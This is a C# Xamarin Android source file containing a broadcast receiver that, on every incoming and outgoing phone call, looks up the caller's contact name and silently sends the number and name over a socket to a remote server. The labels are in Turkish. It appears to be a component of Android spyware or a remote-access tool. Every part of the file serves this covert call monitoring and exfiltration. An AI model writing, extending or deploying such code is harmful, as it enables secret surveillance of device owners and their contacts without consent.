using Android.App;
using Android.Content;
using Android.Telephony;
using System;
using System.Net.Sockets;

namespace Task2
{
    [BroadcastReceiver]
    [IntentFilter(new[] { TelephonyManager.ActionPhoneStateChanged, Intent.ActionNewOutgoingCall })]
    public class PhonecallReceiver : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {

            string state = intent.GetStringExtra(TelephonyManager.ExtraState);
            if (intent.Action == TelephonyManager.ActionPhoneStateChanged)
            {
                if (state == TelephonyManager.ExtraStateRinging)
                {
                    var number = intent.GetStringExtra(TelephonyManager.ExtraIncomingNumber);
                    if (!string.IsNullOrEmpty(number))
                    {
                        try
                        {
                            byte[] dataPacker = ((MainActivity)MainActivity.global_activity).MyDataPacker("ARAMA", System.Text.Encoding.UTF8.GetBytes("Gelen Arama" + "=" +
                          ((MainActivity)MainActivity.global_activity).telefondanIsim(number) + "/" + number + "="));
                            MainActivity.Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }

                    }
                }
            }
            if (intent.Action.Contains(Intent.ActionNewOutgoingCall))
            {
                var number = intent.GetStringExtra(Intent.ExtraPhoneNumber);
                if (!string.IsNullOrEmpty(number))
                {
                    try
                    {
                        byte[] dataPacker = ((MainActivity)MainActivity.global_activity).MyDataPacker("ARAMA", System.Text.Encoding.UTF8.GetBytes("Giden Arama" + "=" +
                                ((MainActivity)MainActivity.global_activity).telefondanIsim(number) + "/" + number + "="));
                        MainActivity.Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }
                }
            }

        }
    }
}